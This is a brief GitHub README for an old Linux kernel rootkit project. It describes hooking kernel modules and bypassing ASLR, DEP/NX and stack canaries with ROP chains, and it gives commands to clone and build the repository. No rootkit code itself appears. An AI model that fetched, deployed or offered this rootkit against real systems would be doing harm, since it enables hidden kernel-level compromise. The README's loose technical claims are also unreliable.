# linux-rootkit
 Kernel <-> Userland
 Ring0

Hooks the LKM and bypasses ASLR, DEP, NX bit, Canaries, etc mostly with gadgets and ROP chains but other tricks are involved. We also move glibc to the side as well, he is not needed. I made this around 2008-2013, wouldn't be hard to get it back working, just need to update the sysclone.d offsets and elf headers, and whatever other technology has been implemented since then? I'm out of the loop, but this was just educational, and getting this back working sounds too much like actual work

## About

C/ASM - This attacks multiple architectures with vmalloc() -> kmem() and kmem() -> tricks (ask me more) 

### Installation

```bash
# Commands
$ git clone https://github.com/awknode/linux-rootkit.git
$ cd linux-rootkit
$ And we have a Makefile, life is easy -- and now you have to copy and paste this line by line if thats how you work 0.0
